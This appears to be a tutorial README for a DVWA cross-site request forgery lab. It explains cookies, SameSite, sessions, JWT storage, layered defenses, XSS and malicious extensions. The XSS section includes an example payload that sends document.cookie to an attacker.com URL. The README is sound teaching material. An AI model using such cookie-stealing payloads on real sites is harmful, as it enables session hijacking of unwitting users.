# Web Security Basics

## What This README Is For

This file covers foundational web concepts needed to understand the CSRF attack in this lab.
Read this first if you are new to cookies, sessions, tokens, or browser storage.

For CSRF-specific theory and per-level analysis, see [README-CSRF.md](README-CSRF.md).

## HTTP Is Stateless

HTTP (HyperText Transfer Protocol) is the protocol your browser uses to talk to websites.
It is stateless by default, meaning every request is independent.
Without extra mechanisms, the server forgets you after every page load and you would have to log in again on every click.

Cookies, sessions, and tokens are the mechanisms that solve this problem.

## Cookies

A cookie is a small piece of key-value data (limited to about 4 kilobytes) stored by the browser for a specific website.

Key behavior: cookies are **automatically attached** to every request your browser makes to that website.
You do not have to write any code for this. The browser does it on its own based on rules like domain, path, expiry, and security attributes.

The server can create cookies (via HTTP response headers) or JavaScript running on the page can create them.

### Cookie Security Flags

Cookies can be configured with security flags:

- `HttpOnly`: JavaScript on the page cannot read the cookie, only the browser's internal networking code can access it
- `Secure`: the cookie is only sent over HTTPS (encrypted connections)
- `SameSite`: controls whether the cookie is sent on cross-site requests (see the SameSite section below)

### SameSite Attribute

`SameSite` is a cookie attribute that controls when cookies are sent in cross-site contexts.
This is directly relevant to CSRF because it determines whether a forged request from an attacker's page will include the victim's cookies.

The server sets `SameSite` through the `Set-Cookie` response header. For example:

```
Set-Cookie: PHPSESSID=abc123; SameSite=Strict; HttpOnly; Secure
```

If the server does not set `SameSite` at all, most modern browsers default to `Lax`.

### How SameSite Decides Whether to Send a Cookie

SameSite is not about which URLs the cookie is attached to (that is what the `Domain` and `Path` cookie attributes do).
SameSite is about **who initiated the request**.

"Site" here means the registrable domain.
So `example.com` is the same site regardless of whether you are on `example.com/page1` or `app.example.com/page2`.

The question SameSite answers is: does the site you are currently on match the site the cookie belongs to?

- If you are on `example.com` and your browser sends a request to `example.com`, that is **same-site**. The cookie is sent regardless of the SameSite setting.
- If you are on `attacker.com` and something on that page triggers a request to `example.com`, that is **cross-site**. Whether the cookie is sent depends on the SameSite value.

### SameSite Values

`SameSite=Strict`:
Cookie is never sent in cross-site contexts. Strong CSRF reduction, but can impact some navigation flows.
For example, if you click a link to `example.com` from an email or from `attacker.com`, the `Strict` cookie will not be sent on that first navigation. You would appear logged out until you navigate within the site again.

`SameSite=Lax`:
Cookie is sent for same-site requests and for top-level cross-site navigations (like clicking a link), but not for cross-site form submissions or background requests.
This is the default in most modern browsers.
It blocks most CSRF attacks while still letting normal link navigation work.

`SameSite=None`:
Cookie is always sent, even in cross-site contexts. Must also include `Secure` (HTTPS only), or modern browsers reject it.
This is the most permissive setting and offers no CSRF protection from the cookie itself.

### Where These Rules Come From

These behaviors come from the HTTP cookie standard and browser security model:
- Cookie model: RFC (Request for Comments) 6265 family
- Standardization body: IETF (Internet Engineering Task Force)
- `SameSite` behavior: modern browser implementations aligned with the evolving RFC 6265bis work

Browser defaults and edge behavior can change over time, so test in the browser versions you actually support.

## Local Storage

Local storage is another way browsers store data for a website, but with different rules.

- Larger capacity (typically 5 to 10 megabytes)
- **Never sent automatically** with requests. If you want to send something from local storage to a server, your JavaScript code must explicitly read it and attach it (usually as a request header)
- No expiration. Data stays until your code deletes it or the user clears browser data
- Only JavaScript running on that specific page can access it

## Cookies vs Local Storage

The critical difference is one word: **automatically**.
Cookies are sent whether you want them to be or not.
Local storage is only sent when your code explicitly does it.

Automatic sending:
- Cookies: yes
- Local storage: no

Readable by JavaScript:
- Cookies: only if the cookie is not marked `HttpOnly`
- Local storage: always

Size limit:
- Cookies: about 4 kilobytes
- Local storage: 5 to 10 megabytes

Expiration:
- Cookies: configurable (can expire after a set time, or on browser close)
- Local storage: never expires on its own

## Sessions

A session is a server-side record that keeps track of who you are across multiple requests.
Sessions rely on cookies to work.

The flow:

1. You log in with your username and password
2. The server creates a session record containing things like your user ID, role, and login timestamp
3. The server sends your browser a session ID (a long random string) inside a cookie
4. On every following request, your browser automatically sends that cookie back
5. The server reads the session ID, looks up the matching record, and knows it is you

What sessions are useful for:

- Staying logged in without re-entering credentials on every page
- Tracking user-specific state like a shopping cart, preferences, or (in DVWA) your current security level
- Access control, so the server can check your session to decide what you are allowed to do

Your browser never stores your actual password or role.
It only holds a session ID, which is a pointer the server uses to look up your real data on its end.

### Session Cookies

A session cookie is the cookie that stores the session ID.
It usually has no long-term expiry and lives until the browser closes (or until the server invalidates the session).
It does not contain your password. It is just a pointer to server-side session state.

### What DVWA Uses

DVWA uses traditional server-side sessions.
Your browser holds a `PHPSESSID` cookie (the default session ID name in PHP), and the server looks that up to identify you as the `admin` user.

## JWT (JSON Web Token)

A JWT solves the same problem as sessions (keeping you authenticated across requests) but stores the data differently.

With sessions, the server stores your data and your browser only holds a meaningless session ID.
With a JWT, the server packs your data (user ID, role, expiration time) directly into a token and signs it with a secret key.
Your browser stores the entire token and sends it with every request.
The server does not need to look anything up. It verifies the signature and reads the data straight from the token.

If someone tampers with the token contents, the signature check fails and the server rejects it.

### Session vs JWT Trade-offs

Server storage:
- Session: yes, the server must store every active session in memory or a database
- JWT: no, the server stores nothing because the data is inside the token

Invalidation (for example, logging out everywhere):
- Session: easy, delete the session record and the session ID becomes useless
- JWT: hard, the token remains valid until it expires because there is nothing to delete server-side

Scalability across multiple servers:
- Session: harder, all servers need access to the same session storage
- JWT: easier, any server with the secret key can verify the token independently

Size:
- Session cookie: tiny, it is just the session ID
- JWT: larger, it contains all your data plus the cryptographic signature

## How Token Storage Affects CSRF Risk

Where you store a JWT changes whether CSRF attacks work against it.

### JWT in a Cookie

Same CSRF risk as sessions.
The browser automatically sends the cookie containing the JWT with every request to that domain.
An attacker page can trigger a forged request and the browser will attach the JWT cookie.
The server sees a valid token and accepts the request.

### JWT in Local Storage

Not vulnerable to CSRF.
When your JavaScript makes a request, it manually reads the JWT from local storage and puts it in a request header (typically called `Authorization`).
An attacker page cannot do this because the browser blocks cross-site access to another site's local storage.
Even if the attacker triggers a request to the server, the JWT will not be included because no code on the attacker page can read it.

### The Trade-off: CSRF vs XSS

Local storage is not vulnerable to CSRF, but it is vulnerable to XSS (Cross-Site Scripting).
If an attacker injects malicious JavaScript into the page through a bug in the application, that script runs in the context of the page and can read local storage.
It could steal the JWT and send it to the attacker.

Cookies have a defense against this: the `HttpOnly` flag.
When a cookie is marked `HttpOnly`, JavaScript cannot read it at all.
Even if an attacker injects a script, they cannot steal an `HttpOnly` cookie.

Summary:
- Cookie storage: vulnerable to CSRF, protected from XSS theft (if `HttpOnly`)
- Local storage: protected from CSRF, vulnerable to XSS theft

## Summary: Layered Defenses

For detailed explanations of Referer checks and anti-CSRF tokens, see [README-CSRF.md](README-CSRF.md).

There is no perfect single option.
Each defense mechanism covers some attack angles but has blind spots:

- `SameSite` cookies: handled by the browser, no code needed, but depends on browser support and can be too permissive with `Lax`
- Referer checks: easy to implement, but unreliable because the header can be missing (privacy extensions, browser settings) or loosely validated (an attacker can craft a URL that contains the target server name in its path to fool a sloppy check)
- Anti-CSRF tokens: strong and reliable because the attacker cannot read the token from a page on another site (the browser's same-origin policy blocks this), but requires careful implementation on every state-changing endpoint and can be bypassed if the application has an XSS vulnerability that lets an attacker inject script into the page and read the token directly
- `HttpOnly` cookies: protect against token theft via XSS, but do not stop CSRF
- Current password verification: strongest step-up check, but impractical for every action

That is why real applications layer multiple defenses together rather than relying on a single one.

## XSS (Cross-Site Scripting)

XSS is an attack where an attacker manages to get their own JavaScript code to run inside a page on the target website.
This is different from CSRF. In CSRF, the attacker triggers a request from a separate page and hopes the browser attaches cookies automatically. In XSS, the attacker's code is running directly inside the target page, as if it were part of the legitimate application.

### How It Happens

XSS typically happens when a website takes user input and puts it into a page without properly sanitizing it.

For example, imagine a search page that displays "You searched for: [your query]" by inserting whatever you typed directly into the HTML. If an attacker types:

```
<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
```

And the server puts that string straight into the page without escaping it, the browser sees it as a real script tag and executes it. The attacker's code is now running inside the target site's page with full access to that page's context.

### Why XSS Is Dangerous

Because the attacker's script runs inside the target page, it has the same privileges as the legitimate page code. It can:

- Read anything on the page, including anti-CSRF tokens hidden in forms
- Read local storage and any cookies not marked `HttpOnly`
- Make requests to the target server that include the user's session cookie (since the script is running on the same origin)
- Modify what the user sees on the page (show fake login forms, change content)
- Redirect the user to attacker-controlled sites

This is why XSS can bypass anti-CSRF tokens. The token is meant to be unreadable by an attacker on a different site, but XSS puts the attacker's code on the same site, so it can read the token directly from the page.

### Types of XSS

Reflected XSS:
The malicious input is sent in a request (for example in a URL parameter) and the server immediately reflects it back in the response without sanitizing it. The attacker tricks the victim into clicking a crafted link that contains the payload. The script runs once when the page loads.

Stored XSS:
The malicious input is saved by the server (for example in a database as a comment or profile field) and displayed to other users later. Every user who views the page with the stored content gets hit. This is more dangerous because the attacker does not need the victim to click a special link.

DOM-based XSS:
The vulnerability is in client-side JavaScript rather than the server. The page's own JavaScript reads untrusted data (like a URL fragment or query parameter) and inserts it into the page without sanitizing it. The server never sees the malicious input because it is processed entirely in the browser.

### How Applications Defend Against XSS

- Output encoding: when displaying user input in HTML, convert special characters like `<`, `>`, `"`, and `&` into their HTML entity equivalents (`&lt;`, `&gt;`, etc.) so the browser treats them as text, not code
- Content Security Policy (CSP): an HTTP header the server sends that tells the browser which sources of JavaScript are allowed to run. Even if an attacker injects a script tag, the browser can refuse to execute it if it does not match the policy
- Input validation: reject or strip input that contains unexpected characters before storing or processing it
- `HttpOnly` cookies: even if XSS runs, it cannot steal cookies marked with this flag

### Why This Is Relevant to CSRF

XSS and CSRF are closely related. A strong anti-CSRF token defense becomes useless if the application also has an XSS vulnerability, because the attacker's injected script can read the token and include it in a forged request. This is why real applications must defend against both attacks simultaneously.

## Malicious Browser Extensions

Browser extensions run with higher privileges than normal JavaScript on a page.
A regular webpage's JavaScript cannot touch certain headers (like `Referer`) or read cookies marked `HttpOnly`.
Extensions are not bound by these restrictions.

A malicious extension can:
- Read and modify any header on any request, including Referer, cookies, and Authorization
- Read the content of any page you visit, including anti-CSRF tokens embedded in forms
- Access cookies and local storage for any site
- Inject JavaScript into any page
- Send requests to any server on your behalf with your full credentials attached

This means a malicious extension can bypass every CSRF defense discussed in this document: SameSite, Referer checks, anti-CSRF tokens, and even current password verification (by reading what you type).

### Why This Is Out of Scope

CSRF defenses assume the browser itself is trustworthy and that the attacker is operating from a separate website.
A malicious extension is already running inside the browser with privileges above what any website has.
At that point, the problem is not CSRF. It is full compromise of the browser.

No website-level defense can protect against an attacker who is already inside the browser.
This is a different security layer entirely, similar to how a lock on your front door does not help if someone is already inside your house.

The practical takeaway: only install extensions you trust, keep them to a minimum, and review what permissions they request.
An extension that asks for "read and change all your data on all websites" has the power to do everything listed above.
